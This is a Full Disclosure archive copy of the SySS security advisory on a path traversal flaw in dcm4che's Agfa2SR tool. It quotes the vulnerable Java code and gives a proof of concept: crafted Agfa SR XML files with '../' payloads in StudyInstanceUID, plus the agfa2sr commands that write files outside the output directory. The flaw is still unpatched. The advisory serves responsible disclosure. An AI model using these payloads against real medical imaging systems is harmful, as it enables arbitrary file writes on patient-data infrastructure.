---
title: [SYSS-2026-080]: dcm4che - Path Traversal (CWE-22)
url: https://seclists.org/fulldisclosure/2026/Oct/25
source: Full Disclosure
date: 2026-10-15
fetch_date: 2026-10-16T06:37:49.365087
---

# [SYSS-2026-080]: dcm4che - Path Traversal (CWE-22)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-080]: dcm4che - Path Traversal (CWE-22)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 15 Oct 2026 09:32:10 +0200

---

```
Advisory ID:               SYSS-2026-080
Product:                   dcm4che
Manufacturer:              J4Care
Affected Version(s):       5.35.0
Tested Version(s):         5.35.0
```

Vulnerability Type: Improper Limitation of a Pathname to a
Restricted Directory (CWE-22)

```
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2026-08-06
Public Disclosure:         2026-10-13
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:
```

dcm4che is a Java-based Digital Imaging and Communications in Medicine
(DICOM)
toolkit providing libraries and command-line utilities for processing,
storing,

```
and transmitting DICOM data (see [1]).

The Agfa2SR command-line tool in dcm4che is vulnerable to a path traversal
attack. An attacker who can supply an Agfa XML SR (Structured Report) file
for processing with Agfa2SR can write files outside the configured output
directory by injecting "../" sequences into the StudyInstanceUID field.

This allows attackers to achieve arbitrary file write on the target system.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The Agfa2SR tool converts Agfa XML SR reports into DICOM or XML output
files. It processes files containing reports delimited by
<agfa:DiagnosticRadiologyReport>...</agfa:DiagnosticRadiologyReport> tags.

Two path traversal vectors exist in the tool:

Vector 1: getWriter path (Agfa2SR.java:268-271)

When no XSLT stylesheet is configured (via the -x none flag), the report
is written as XML. The StudyInstanceUID extracted from the input XML is
used directly as the output filename without validation:

  private BufferedWriter getWriter(String outDir, String siuid) {
      return Files.newBufferedWriter(
          Paths.get(outDir, siuid + ".xml"),  // NO path validation
          StandardCharsets.UTF_8);
  }

Vector 2: DICOM output path (Agfa2SR.java:240)

When an XSLT stylesheet is configured, the report is converted to DICOM
and the filename is derived from DICOM attribute values via
AttributesFormat.format(). The default format pattern is {0020000D}
(StudyInstanceUID):

  File file = new File(outDir, format.format(attrs));

If an attacker provides an Agfa SR report XML containing
<StudyInstanceUID>../outside_agfa2sr</StudyInstanceUID>, the resulting
file path for Vector 1 resolves to:

  Paths.get(outDir, "../outside_agfa2sr.xml")

which is the parent directory of outDir. For Vector 2, a StudyInstanceUID
containing "../" in its DICOM attribute value similarly escapes the output
directory via the format.format() substitution.

A crafted Agfa SR report XML is straightforward to construct. It requires
the START_OF_REPORT marker (<agfa:DiagnosticRadiologyReport), the
StudyInstanceUID element containing the traversal payload, and an
END_OF_REPORT marker (</agfa:DiagnosticRadiologyReport>). The agfa2sr
binary processes such input without error.

The root cause is the missing validation of the StudyInstanceUID and
format.format() output before their use in file path operations.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

The path traversal (vector 1) can be demonstrated by creating an Agfa SR
report with a path traversal payload in the StudyInstanceUID field.

cat > report1.xml << 'EOF'
<agfa:DiagnosticRadiologyReport xmlns:agfa="http://agfa.com";>
<StudyInstanceUID>../outside_agfa2sr</StudyInstanceUID>
<PatientName>Test^Patient</PatientName>
</agfa:DiagnosticRadiologyReport>
EOF

The output directory for agfa2sr (in this example "/tmp/output") has to
exist.

Running agfa2sr with no XSLT, which triggers the "getWriter" path, writes
the file "/tmp/outside_agfa2sr.xml" one directory level above the
configured output directory.

agfa2sr -x none -d /tmp/output report1.xml

The path traversal (vector 2) allows writes to directies that do not already
exist. The output directory (in this example "/tmp/output") has to exist.

cat > report2.xml << 'EOF'
<agfa:DiagnosticRadiologyReport xmlns:agfa="http://www.agfa.com/hc";>
  <StudyInstanceUID>../outside_agfa2sr/poc</StudyInstanceUID>
  <OrderDetails>
    <AccessionNumber>POC</AccessionNumber>
    <ReferringPhysician>
      <Name>
        <SingleByteName>
          <LastName>Doe</LastName>
          <FirstName>John</FirstName>
        </SingleByteName>
      </Name>
    </ReferringPhysician>
    <StudyDetails>
      <StudyInstanceUID>../outside_agfa2sr/poc</StudyInstanceUID>
      <StudyDescription>POC Scan</StudyDescription>
      <ReasonForStudy>Security testing</ReasonForStudy>
    </StudyDetails>
  </OrderDetails>
  <PatientDetails>
    <Name>
      <SingleByteName>
        <LastName>POC</LastName>
        <FirstName>Vector2</FirstName>
      </SingleByteName>
    </Name>
    <Id>
      <IdText>PAT001</IdText>
      <IdDomain>Hospital</IdDomain>
    </Id>
    <BirthDate>19800101</BirthDate>
    <Sex>M</Sex>
  </PatientDetails>
  <ReportDetails>
    <ReportStatus>Preliminary</ReportStatus>
    <InterpretationRecordDate>20260101</InterpretationRecordDate>
    <InterpretationRecordTime>120000</InterpretationRecordTime>
    <ReportBody>Path traversal PoC for SYSS-2026-080 Vector 2</ReportBody>
  </ReportDetails>
</agfa:DiagnosticRadiologyReport>
EOF

Running agfa2sr with this report creates the file "../outside_agfa2sr/poc"
outside the specified output directory in a new directory.

agfa2sr -d /tmp/output report2.xml

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

SySS GmbH is not aware of a security update for the described issue.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2026-08-06: Vulnerability reported to manufacturer
2026-09-04: Vulnerability reported to manufacturer again
2026-10-13: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] dcm4che project website
    https://www.dcm4che.org/
[2] SySS Security Advisory SYSS-2026-080
```

<https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-080.txt>

```
[3] SySS GmbH, SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Matthias Deeg of SySS GmbH with
the assistance of SySS AI.

E-Mail: matthias.deeg (at) syss.de
```

Public Key:
<https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc>

```
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest v...